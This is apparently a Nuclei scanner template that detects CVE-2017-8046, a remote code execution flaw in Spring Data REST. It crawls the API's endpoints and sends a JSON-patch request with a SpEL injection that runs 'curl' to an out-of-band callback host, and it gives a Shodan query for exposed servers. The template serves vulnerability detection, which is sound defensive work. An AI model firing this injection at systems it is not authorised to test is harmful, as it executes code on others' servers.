id: CVE-2017-8046

info:
  name: Spring Data REST < 2.6.9 (Ingalls SR9) / 3.0.1 (Kay SR1) - PATCH Request Remote Code Execution
  author: domwhewell-sage
  severity: critical
  description: |
    Spring Data REST < 2.6.9 and 3.0.1, Spring Boot < 1.5.9 and 2.0 M6 contain a remote code execution caused by processing malicious PATCH requests with crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.
  impact: |
    Malicious PATCH requests submitted to servers using Spring Data REST versions prior to 2.6.9 (Ingalls SR9), versions prior to 3.0.1 (Kay SR1) and Spring Boot versions prior to 1.5.9, 2.0 M6 can use specially crafted JSON data to run arbitrary Java code.
  remediation: |
    To remediate this vulnerability, update to Spring Data REST version 2.6.9 or later, or 3.0.1 or later, and Spring Boot version 1.5.9 or later, or 2.0 M6 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-8046
    - https://spring.io/security/cve-2017-8046
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-8046
    cwe-id: CWE-20
    cpe: cpe:2.3:a:pivotal_software:spring_data_rest:*:*:*:*:*:*:*:*
  metadata:
    vendor: pivotal_software
    product: spring_data_rest
    shodan-query: http.title:"eureka"
  tags: cve,cve2017,pivotal,springboot,pivotal_software

flow: |
  http(1)
  for(let endpoint_urls of iterate(template.endpoints)){
    set("endpoints", endpoint_urls)
    http(2)
  }

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    redirects: true
    max-redirects: 3

    extractors:
      - type: regex
        name: endpoints
        part: body
        group: 1
        internal: true
        regex:
          - '"href"\s*:\s*"([^"{]+)'

  - method: PATCH
    path:
      - "{{endpoints}}/1"
    headers:
      Content-Type: application/json-patch+json
    body: |
      [
        {
          "op": "replace",
          "path": "T(java.lang.Runtime).getRuntime().exec(\"curl {{interactsh-url}}\").x",
          "value": "pwned"
        }
      ]

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns